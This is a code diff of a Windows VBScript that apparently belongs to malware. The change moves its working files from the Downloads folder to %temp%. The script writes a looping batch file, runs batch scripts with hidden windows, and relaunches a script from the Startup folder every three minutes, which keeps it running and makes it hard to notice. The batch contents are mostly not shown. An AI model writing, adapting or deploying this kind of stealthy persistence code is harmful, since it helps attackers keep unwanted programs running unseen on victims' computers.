@@ -1,7 +1,7 @@
 Set objShell = CreateObject("WScript.Shell")
-downloads_dir = objShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads")
-objShell.CurrentDirectory = Left(downloads_dir, 2)
-objShell.CurrentDirectory = downloads_dir
+temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
+objShell.CurrentDirectory = Left(temp_dir, 2)
+objShell.CurrentDirectory = temp_dir
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objFile = objFSO.CreateTextFile("pro1.bat")
 objFile.WriteLine "@echo off"
@@ -63,8 +63,8 @@ objFile.WriteLine ")"
 objFile.WriteLine "goto loop" 
 objFile.Close
 
-objShell.Run "%USERPROFILE%\Downloads\post.bat", 0, True
-objShell.Run "pro1.bat", 0, False
+objShell.Run "%temp%\post.bat", 0, True
+objShell.Run "%temp%\pro1.bat", 0, False
 DO
    objShell.Run "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs", 0, False
    WScript.Sleep 180000
